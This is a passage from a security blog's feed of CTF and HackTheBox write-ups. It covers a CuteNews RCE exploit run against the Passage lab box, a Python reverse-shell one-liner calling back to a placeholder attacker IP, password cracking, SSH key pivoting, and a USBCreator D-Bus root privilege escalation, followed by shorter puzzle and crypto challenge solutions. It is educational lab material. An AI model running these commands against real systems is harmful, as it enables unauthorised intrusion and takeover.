<code>index.php?mod=main&amp;opt=personal</code>. <br>There is no effective control of <code>$imgsize</code> in <code>/core/modules/dashboard.php</code>. The header content of a file can be changed and the control can be bypassed for code execution. (An attacker can use the GIF header for this.) [<a href="https://www.cvedetails.com/cve/CVE-2019-11447/">Source</a>]</blockquote><p>I didn&apos;t event have to do any work for this one, since I found a <a href="https://www.exploit-db.com/exploits/48800">working exploit</a>.</p><pre><code>~ python3 cutenews.py

Enter the URL&gt; http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: ieQ5Hpbxxd and password: ieQ5Hpbxxd

=======================================================
Sending Payload
=======================================================
signature_key: 372b3c37331c51a3d8b0913162391f60-ieQ5Hpbxxd
signature_dsi: 1b2359d409dd82293a1dcea4c28a824b
logged in user: ieQ5Hpbxxd
============================
Dropping to a SHELL
============================

command &gt;</code></pre><p>Et voil&#xE0;! We got a shell! Let&apos;s upgrade it.</p><!--kg-card-begin: markdown--><pre><code>/usr/bin/python -c &apos;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;[ATTACKERS_IP]&quot;,[ATTACKERS_PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&apos;
</code></pre>
<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>It looks like we have 2 users on this machine: <code>nadav</code> and <code>paul</code>.</p><pre><code>ls -la /home/
...
drwxr-x--- 17 nadav nadav 4096 Sep 22 03:13 nadav
drwxr-x--- 16 paul  paul  4096 Sep  2 07:18 paul</code></pre><p>Let&apos;s try to crack the hashes we collected on the previous step:</p><pre><code>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</code></pre><p>Using a SHA-256 &quot;<a href="https://md5decrypt.net/en/Sha256/">online decrypter</a>&quot; we immediately find a match for the 3rd one: <code>atlanta1</code>. &#xA0;Let&apos;s see if I can use it with one of the known users:</p><pre><code>www-data@passage:/var/www/html/CuteNews/uploads$ su - paul
su - paul
Password: atlanta1

paul@passage:~$ cat user.txt
03a499ddd51ad76b6e774d536068dcf3</code></pre><p>Second user was a flash. It seems like we can use a private key stored in <code>paul</code>&apos;s <code>.ssh</code> directory to authenticate as <code>nadav</code>:</p><pre><code>paul@passage:~/.ssh$ ls -la
total 24
drwxr-xr-x  2 paul paul 4096 Jul 21 10:43 .
drwxr-x--- 17 paul paul 4096 Nov  8 04:55 ..
-rw-r--r--  1 paul paul  948 Nov  8 04:52 authorized_keys
-rw-------  1 paul paul 1679 Jul 21 10:43 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21 10:43 id_rsa.pub
-rw-r--r--  1 paul paul 1312 Jul 21 10:44 known_hosts

paul@passage:~/.ssh$ ssh -i id_rsa nadav@passage.htb
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$</code></pre><p>Let&apos;s set up public key authentication on <code>nadav</code>&apos;s account directly:</p><pre><code>nadav@passage:~/.ssh$ echo &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/dTPIIPRFgRuu8I2qZ/1T6nvmR0T9Z0K627aKq9tWov1MntZGPes6gwzOtMwT2BhnBemGoSaTrquwgOMhALLdeGiFoJKG+kyazLn4NZSe6JNuhqP2E51f0vlBAqHxBMf651ddLs1tVHfhGJH95hw54DDyKXLQFjSQl3jc133HQnH9TIwm/v0xk/3aQUa5tvxfdKD4MpaoYKfV5gqA2yoOjqEImmvzsau0MpJn094eWHNJBU+w0sz8X2+b5tCwHCJajdL1GTcD5rOGke1e5lzUwklAH4m2HJkIw1MFhTuzY1LZbAsa5eSn41O9UeSct9RplocLo1DOHltoc/TReH2ODdb0b9oeEHIYRrMNY65OXAAz9gMA5dyUL2cEfo4O/oQVIJ7SLV2D8g3/FDgBaX1k2zp0ON7UyW3Oh9BBM2oKffiL7hN9X2ltjj3tcuzhh4qR2spOPIMwpUyS1aJnyh7+LNvaQ4QqSZR6TTzkBSS13nKRnEwPzbh6HFlfuaTSQJ0=&apos; &gt;&gt; /.ssh/authorized_keys</code></pre><p>Now we can simply <code>SSH</code> as <code>nadav</code>:</p><pre><code>~ ssh -i id_rsa nadav@passage.htb
Last login: Sun Nov  8 04:56:41 2020 from 127.0.0.1
nadav@passage:~$</code></pre><hr><h2 id="getting-root">Getting root</h2><p>After not getting anything of relevance from the normal enumeration process, I turned to some local files to try and find some clues:</p><pre><code>nadav@passage:~$ cat .viminfo
...

# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&amp;AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
&apos;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&apos;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&apos;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&apos;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&apos;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&apos;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&apos;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&apos;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	&quot;	12	7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	&quot;	2	0
	.	2	0
	+	2	0</code></pre><p>So it seems like <code>nadav</code> has replaced <code>AdminIdentities=unix-group:root</code> with <code>AdminIdentities=unix-group:sudo</code>, in a couple of files:</p><ul><li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li><li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li></ul><p>This is very interesting because <code>nadav</code> belongs to the <code>sudoer</code> group.</p><p>After looking around for some priv esc vulnerabilities related to <code>USBCreator</code> I stumbled upon <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">this</a> article:</p><blockquote>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root &#x2013; without supplying a password. [<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">Source</a>]</blockquote><p>Following that article, I used <code>gdbus</code> to copy the flag from its original location to an accessible directory and then read the accessible file:</p><pre><code>~ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag.txt true
()

~ cat /tmp/flag.txt</code></pre><hr>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Neuromancer]]></title><description><![CDATA[<p>This month, I was responsible for putting together the <a href="https://www.meetup.com/pt-BR/0xOPOSEC/">&#xD8;xOPOS&#x246;C</a> monthly challenge. </p><p>Even though the competition is done, if you want to try it out yourself the application is still available <a href="https://neuromancer.herokuapp.com/">here</a>. </p><p>So, <strong>if you don&apos;t want spoilers, stop reading!</strong></p><hr><h2 id="onto-the-solutions-">Onto the solutions!</h2><p>The challenge</p>]]></description><link>https://inesmartins.github.io//oposec-neuromancer/</link><guid isPermaLink="false">60285c828950580750b7d7d8</guid><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><category><![CDATA[neuromancer]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 23 Feb 2021 20:14:29 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/02/image-26-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2021/02/image-26-1.png" alt="&#xD8;xOPOS&#x246;C | Neuromancer"><p>This month, I was responsible for putting together the <a href="https://www.meetup.com/pt-BR/0xOPOSEC/">&#xD8;xOPOS&#x246;C</a> monthly challenge. </p><p>Even though the competition is done, if you want to try it out yourself the application is still available <a href="https://neuromancer.herokuapp.com/">here</a>. </p><p>So, <strong>if you don&apos;t want spoilers, stop reading!</strong></p><hr><h2 id="onto-the-solutions-">Onto the solutions!</h2><p>The challenge consisted of <a href="https://neuromancer.herokuapp.com/">a Heroku app</a> with a very simple interface. If you took a closer look at the source code you&apos;d see only an <code>&lt;img&gt;</code> sourced from Wikipedia (to prevent you from straying into steg territory) and an interesting comment:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-27.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>By googling the entire thing, you&apos;d see that <a href="https://www.goodreads.com/quotes/14638-cyberspace-a-consensual-hallucination-experienced-daily-by-billions-of-legitimate">this is a quote from the book &quot;Neuromancer&quot;</a>, but with a slight difference:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/02/image-29.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>So, your first official hint was &quot;how do you get in?&quot;, which should get you thinking about authentication and point you in the direction of <a href="https://neuromancer.herokuapp.com/login">the login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-30.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>If this page is under development, maybe the developers have already implemented the authentication mechanism ...</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-31.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>Yup, now we&apos;re getting somewhere.</p><hr><h2 id="hint-2-how-much-do-you-know-about-neuromancer">Hint 2: How much do you know about Neuromancer?</h2><p>Just in case you thought this authentication feature had some interesting vulnerability, I released another hint to lure you in the right direction - <a href="https://en.wikipedia.org/wiki/Open-source_intelligence">OSINT</a>.</p><p>At this point, you could either solve this by brute-forcing or by googling.</p><h3 id="option-1-brute-force">Option 1 - Brute-force</h3><p>You could use a wordlist generator like <a href="https://tools.kali.org/password-attacks/cewl">cewl</a>, which (depending on the source you used) would most likely output the username and password on the top 50 words.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-32.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>If you then removed &quot;common&quot; words, this list would shrink down to 20, which means you could easily go through all of the possible combinations for both fields and solve the challenge:</p><h3 id="option-2-googling">Option 2 - Googling</h3><p>You could start by searching for the book&apos;s character list:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-33.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>Neuromancer doesn&apos;t have a lot of characters in general, and the username - <code>case</code> - is the main character, so this was pretty straightforward. </p><p>Also, as soon as you tried <code>case</code> as the username, you&apos;d see that the response was now different: </p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-34.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>From this point on, you could again brute-force for the password or you could google &quot;Neuromancer password&quot;, which would take you to <a href="https://scifi.stackexchange.com/questions/6433/what-is-the-password-at-the-end-of-neuromancer">this</a> stackexchange question:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-35.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-36.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>Although not the password in the book, <code>wintermute</code> was indeed the password for this challenge:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/02/image-37.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Neuromancer" loading="lazy"></figure><p>That&apos;s it, hope you enjoyed it!</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks - Part III]]></title><description><![CDATA[<p>This level starts with the email message where the <a href="https://inesmartins.github.io/oposec-baby-challenge/">last level</a> ended:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-39.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-40.png" class="kg-image" alt loading="lazy"></figure><p>When we go to <a href="https://sefod.eu/ctf/snippet.html">the link at the end of the message</a> we see a simple HTML page that contains a <code>&lt;meta&gt;</code> tag that uses <a href="https://www.w3schools.com/tags/att_meta_http_equiv.asp">the http-equiv attribute</a>:</p><pre><code>&lt;html&gt;
   &lt;body&gt;
      &lt;b&</code></pre>]]></description><link>https://inesmartins.github.io//opoleaks-underground-leaks-part-iii/</link><guid isPermaLink="false">5fd27a6e8950580750b7b566</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Jan 2021 17:27:10 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/01/image-22-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2021/01/image-22-1.png" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III"><p>This level starts with the email message where the <a href="https://inesmartins.github.io/oposec-baby-challenge/">last level</a> ended:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-39.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-40.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>When we go to <a href="https://sefod.eu/ctf/snippet.html">the link at the end of the message</a> we see a simple HTML page that contains a <code>&lt;meta&gt;</code> tag that uses <a href="https://www.w3schools.com/tags/att_meta_http_equiv.asp">the http-equiv attribute</a>:</p><pre><code>&lt;html&gt;
   &lt;body&gt;
      &lt;b&gt;Please wait while you are being redirected...&lt;/b&gt;
      &lt;meta http-equiv=&quot;refresh&quot; content=&quot;5; URL=https://sefod.eu/ctf/0xOPOSEC_0x0E_DTMF_MultiTap.pdf&quot; /&gt;
   &lt;/body&gt;
&lt;/html&gt;</code></pre><p>As expected, 5 seconds after the page is loaded, we&apos;re redirected to <a href="https://sefod.eu/ctf/0xOPOSEC_0x0E_DTMF_MultiTap.pdf">https://sefod.eu/ctf/0xOPOSEC_0x0E_DTMF_MultiTap.pdf</a>.</p><p>After a bit of trial and error, we realise that the <code>PDF</code> is hiding more than meets the eye (indeed &quot;things are not always what they seem&quot;):</p><pre><code>$ curl -X GET https://sefod.eu/ctf/0xOPOSEC_0x0E_DTMF_MultiTap.pdf &gt; out.file

$ file out.file
out.file: DOS/MBR boot sector</code></pre><p>The file contains a boot loader, which we can check by searching for the magic bytes (<code>0x55 0xAA</code>) in position <code>0x1FE</code>.</p><hr><h2 id="getting-through-the-front-door">Getting through the front door</h2><p>We can run load this boot loader using <a href="https://www.qemu.org/">qemu</a>, an &quot;open source machine emulator and virtualizer&quot;:</p><pre><code>$ qemu-system-i386 -fda out.file
SeaBIOS (version 1.14.0-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+07F8F4C0+07ECF4C0 CA00



Booting from Hard Disk...
Boot failed: could not read the boot disk

Booting from Floppy...</code></pre><p>After &quot;Booting from Floppy&quot; we can see the intro screen:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-22.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>A few seconds later this authentication form is displayed:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-24.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>Since I didn&apos;t know the credentials, I decided to try and dump the machine&apos;s <code>RAM</code> using <code>qemu-monitor</code>&apos;s <code>dump-guest-memory</code> utility:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-51.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>Then, by simply running <code>strings</code> on the <code>memdump</code> file I realised that the credentials were <code>root:toor</code>.</p><hr><h2 id="12-days-of-opoteam">12 days of OPOTEAM</h2><p>When we enter the credentials we see this screen:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-25.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>Let&apos;s check out the options!</p><h3 id="o-is-for-0xopoleaks">&quot;o&quot; is for 0xOPOLEAKS</h3><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-27.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>Simply by combining all of the letters that shouldn&apos;t be uppercase we get the flag: <code>FLAG{SONHOSWILLKEEPYOUDREAM}</code></p><h2 id="f-is-for-xmas-flag">&quot;f&quot; is for Xmas Flag</h2><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-28.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>Not really a challenge, more of a Christmas message. Flag is <code>FLAG{COSCOROES_IS_THE_REAL_DEAL}</code>.</p><h2 id="v-is-for-vault">&quot;v&quot; is for Vault</h2><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-30.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>On this challenge, the prompt would only display a certain char when it matched the exact position of the flag, which meant we had to &quot;brute-force&quot; the solution manually, re-entering partial flags until we got the final one.</p><p>Flag is &#xA0;<code>FLAG{RABANADAS_GIVE_STRENGTH_TO_BRUTEFORCE}</code>.</p><h3 id="g-is-for-glitch-in-the-matrix">&quot;g&quot; is for Glitch in the Matrix</h3><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-32.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>Using <a href="https://gchq.github.io/CyberChef/#recipe=Disassemble_x86(&apos;64&apos;,&apos;Full%20x86%20architecture&apos;,16,0,true,true)&amp;input=QjQwRUIwNDFDRDEw">CyberChef</a> we can see the instructions encoded in the example Shellcode: <code>B40EB041CD10</code>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-31.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><pre><code>B40E                            MOV AH,0E
B041                            MOV AL,41
CD10                            INT 10
</code></pre><p>So, it seems like this code is able to print &quot;A&quot; since its hex value (41) is being moved to the <code>AL</code> register on the second operation. This means that most likely all we need to do is change the second operation with one that retrieves the value stored in <code>0X1337</code>.</p><p>Since I&apos;m not very familiar with shellcode I started by trying to retrieve the original instructions from <a href="https://en.wikipedia.org/wiki/X86_assembly_language">x86 Assembly</a> code:</p><pre><code>$ nano glitch.asm

;glitch.asm
[SECTION .text]
global _start

_start:
        mov ah, 0x0E
        mov al, 0x41
        int 0x10</code></pre><p>Then I converted the Assembly code to object code (<code>.o</code>) using <a href="https://en.wikipedia.org/wiki/Netwide_Assembler">NASM</a>, and then generated the final executable using <a href="https://linux.die.net/man/8/ld-linux">ld</a>.</p><pre><code>$ nasm -f elf glitch.asm
$ ld -m elf_i386 -s -o glitch glitch.o

$ ls -la
...
-rw-r--r-- 1 vagrant vagrant  192 Dec 12 07:01 glitch.asm
-rw-r--r-- 1 vagrant vagrant  432 Dec 12 07:06 glitch.o
-rwxr-xr-x 1 vagrant vagrant 4244 Dec 12 07:10 glitch</code></pre><p>Finally, I disassembled the executable &#xA0;using <code>objdump</code>, which gets us its corresponding shellcode:</p><pre><code>$ objdump -d glitch

glitch:     file format elf32-i386

Disassembly of section .text:
08049000 &lt;.text&gt;:
 8049000:	b4 0e                	mov    $0xe,%ah
 8049002:	b0 41                	mov    $0x41,%al
 8049004:	cd 10                	int    $0x10</code></pre><p>Great, we got the original shellcode! Now we can simply change the Assembly code to retrieve the value stored at <code>0x1337</code>.</p><pre><code>$ nano glitch.asm

;glitch.asm

[SECTION .text]
global _start

_start:
        mov ah,0x0E
        mov al,[0x00001337]
        int 0x10</code></pre><p>Let&apos;s do the same process as before to get the shellcode:</p><pre><code>$ nasm -f elf glitch.asm
$ ld -m elf_i386 -s -o glitch glitch.o
$ objdump -d glitch

glitch:     file format elf32-i386
Disassembly of section .text:

08049000 &lt;.text&gt;:
 8049000:	b4 0e                	mov    $0xe,%ah
 8049002:	a0 37 13 00 00       	mov    0x1337,%al
 8049007:	cd 10                	int    $0x10</code></pre><p>The shellcode is <code>b40ea037130000cd10</code>, let&apos;s see what happens when we enter it on the program:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/12/image-35.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><p>By repeating the process for the following addresses I got the complete flag: <code>FLAG{filhoses_will not keep_you_fit}</code>.</p><hr><h2 id="taking-the-hint">Taking the hint</h2><p>A short while after the challenge was published, a new hint was released, a Portuguese sketch show that uses the word <code>kunami</code>. </p><p>With a bit of Googling I found something interesting, the <a href="https://en.wikipedia.org/wiki/Konami_Code">Konami Code</a>. After trying the sequence <code>&#x2191;&#x2191;&#x2193;&#x2193;&#x2190;&#x2192;&#x2190;&#x2192;BA</code> on the menu I got:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/01/image-25.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks - Part III" loading="lazy"></figure><hr><p>Unfortunately, I didn&apos;t get all of the flags, but you can check out the Github project and official write-up <a href="https://github.com/zezadas/0xOPOSEC_0x0F_Polyglot_PDF_MBR_Bootloader">here</a>.</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks (Crypto) - Part II]]></title><description><![CDATA[Write-up for the second part of the Underground Leaks saga, that includes DTMF and Multi-tap Cipher.]]></description><link>https://inesmartins.github.io//oposec-underground-leaks-part-ii/</link><guid isPermaLink="false">5fb2be5f501631398682068b</guid><category><![CDATA[crypto]]></category><category><![CDATA[cryptography]]></category><category><![CDATA[oposec]]></category><category><![CDATA[dtmf]]></category><category><![CDATA[phone keypad cipher]]></category><category><![CDATA[multitap phone cipher]]></category><category><![CDATA[phone keypad]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 09 Dec 2020 22:00:00 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/12/banner.png" medium="image"/><content:encoded><![CDATA[<blockquote>The last mission was a success, and the government forces gave us another project, the information is short, but we know that we are on the path of the 0xOPOLEAKS. We think this is somehow related to mobile communications, can you help us? <br><a href="http://sefod.eu/ctf/signal.wav">http://sefod.eu/ctf/signal.wav</a></blockquote><img src="https://inesmartins.github.io//content/images/2020/12/banner.png" alt="&#xD8;xOPOS&#x246;C | Underground Leaks (Crypto) - Part II"><p>The <code>.wav</code> file contains a sequence of what sounds like keys being dialled on a phone, aka DTMF (<a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling">Dual-tone multi-frequency signaling</a>). <br>Luckily, <a href="https://github.com/ribt/dtmf-decoder">this library</a> does all of the hard work of decoding the tones:</p><pre><code>~ sudo pip3 install numpy matplotlib scipy
~ git clone https://github.com/ribt/dtmf-decoder/
~ cd dtmf-decoder
~ chmod +x dtmf.py
~ ./dtmf.py [path_to_file]/signal.wav
2244485559990666766699627777</code></pre><p>So, it seems like we have another cipher to crack. Since this cipher includes numbers being repeated, but never more than 4 times, this is clearly a <a href="https://www.dcode.fr/phone-keypad-cipher">Phone Keypad/Multi-Tap Cipher</a><a href="https://www.dcode.fr/multitap-abc-cipher">,</a> aka what you get when you use an older phone to text someone.</p><p>After decoding that message we get: <code>bitly.opoxmas</code>.</p><p>So we go to <a href="http://bitly.com/opoxmas">http://bitly.com/opoxmas</a> and we&apos;re redirected to <a href="https://sefod.eu/flag_xmas_1337.html">the page with the flag</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/11/image-42.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C | Underground Leaks (Crypto) - Part II" loading="lazy"></figure>]]></content:encoded></item><item><title><![CDATA[HTB Crypto Challenge | Call]]></title><description><![CDATA[Write-up for retired HTB crypto challenge that involves DTFM and Prime Numbers Cipher.]]></description><link>https://inesmartins.github.io//htb-crypto-challenge-call/</link><guid isPermaLink="false">5eed049e1e7da103a083dca2</guid><category><![CDATA[crypto]]></category><category><![CDATA[dtfm]]></category><category><![CDATA[prime numbers]]></category><category><![CDATA[wav]]></category><category><![CDATA[htb]]></category><category><![CDATA[mp3]]></category><category><![CDATA[ffmpeg]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 22 Nov 2020 11:36:40 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/11/66a3aDTMFpad.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/11/66a3aDTMFpad.jpg" alt="HTB Crypto Challenge | Call"><p>Banner source: <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling#/media/File:66a3aDTMFpad.jpg">https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling#/media/File:66a3aDTMFpad.jpg</a></p><blockquote>Hint: The flag format is: HTB{PASSWORD}</blockquote><p>We&apos;re given an audio file called <code>sound.mp3</code> that contains the very familiar sound of numbers being &quot;dialled&quot; on a phone aka <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling">DTFM (Dual-Tone Multi-Frequency Signaling)</a>.</p><p>I found an <a href="http://dialabc.com/sound/detect/index.html">online tool</a> and also a <a href="https://github.com/ribt/dtmf-decoder">Github project</a> that were able to accurately decode DTMF tones from an audio file, however, these tools only support <code>.wav</code> files so I started by converting the <code>.mp3</code> into <code>.wav</code> with <code>ffmpeg</code>. </p><!--kg-card-begin: markdown--><pre><code>$ ffmpeg -i sound.mp3 sound.wav
</code></pre>
<!--kg-card-end: markdown--><p>So here&apos;s the output:</p><!--kg-card-begin: markdown--><pre><code>2331434783711923431767372331117714113
</code></pre>
<!--kg-card-end: markdown--><p>Then I distributed the numbers in the same cadence as the keys were pressed in the audio file:</p><!--kg-card-begin: markdown--><pre><code>23 31 43 47 83 71 19 23 43 17 67 37 23 31 11 7 71 41 13
</code></pre>
<!--kg-card-end: markdown--><p>At this point I was stuck. <br>I spent a lot of time trying to find a cipher that would fit this sequence, but finally it was a tip from the <a href="https://forum.hackthebox.eu/discussion/1914/call-challenge/p1">forum</a> about looking for the &quot;inherent mathematical properties&quot; of these numbers that let me to realise <strong>that these are all prime numbers</strong>.</p><p>Finally, I used <a href="https://www.dcode.fr/prime-numbers-cipher">this</a> Prime Numbers Cipher decoder to get the flag:</p><!--kg-card-begin: markdown--><pre><code>HTB{IKNOWTHINGSLIKEDTMF}
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Tabby]]></title><description><![CDATA[Write-up for Tabby, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-write-up-tabby/</link><guid isPermaLink="false">5efcd8e41e7da103a083e97f</guid><category><![CDATA[htb]]></category><category><![CDATA[tomcat]]></category><category><![CDATA[fcrackzip]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 07 Nov 2020 21:59:12 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" medium="image"/><content:encoded><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/259">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sC -sV -A -T4 tabby.htb

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 17:47 WEST
Nmap scan report for tabby.htb (10.10.10.194)
